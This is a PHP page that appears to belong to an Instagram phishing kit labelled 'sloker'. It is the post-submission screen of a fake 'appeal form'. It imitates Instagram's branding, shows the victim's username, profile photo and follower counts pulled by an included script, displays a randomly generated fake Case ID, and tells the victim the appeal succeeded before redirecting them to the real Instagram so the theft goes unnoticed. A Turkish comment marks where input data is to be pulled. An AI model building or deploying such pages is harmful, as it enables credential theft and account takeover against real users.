<?php
ob_start();
session_start();
set_time_limit(0);
error_reporting(0);
 
include('slokerapi/sloker.php'); 

  ?>


<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	   <title>Confirmed • @<?php echo $username; ?></title>

       <link rel="icon" sizes="192x192" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">

	<link rel="stylesheet" type="text/css" href="slokerconfirmed.css">
</head>
<body>


	<div class="slokerborder">
		<center>		<img src="slokerimg/1.png" width="125" style="margin-top: 10px; margin-left: -1300px;">
			</center>

			</div>

<div class="slokermain">

<center>
  <img src="<?php echo $pp; ?>" style="width: 120px; border-radius: 50%; margin-left: 15px;" alt="">
</center>
<h3 class="slokertelif9">@<?php echo $username; ?></h3>
<br>
<h3 style="  text-align: center;
    font-family: 'Poppins';
    color: black;
    font-size: 13px;"><?= $gonderi ?> • <?= $takipci ?> • <?= $takip ?></h3>
<br>
  
  <h3 class="slokertelif9">Successfully Completed</h3>

<h3 class="slokertelif4">Dear <font color="red">@<?php echo $username; ?> </font> , Your appeal form has been successfully completed. Thank you for your understanding.

</h3>

<br>
  <h3 class="slokertelif9">Case ID: <?php echo(rand(10,10000000));?></h3>
<form method="post">
<!--Veri Çekilecek İnputlar-->
<br>
<!--Veri Çekilecek İnputlar / Sloker-->
<button type="submit"   class="slokerbtn" onclick="window.location.href = 'https://www.instagram.com';">Go To Instagram</button>

</form>




</div>




</body>



</html>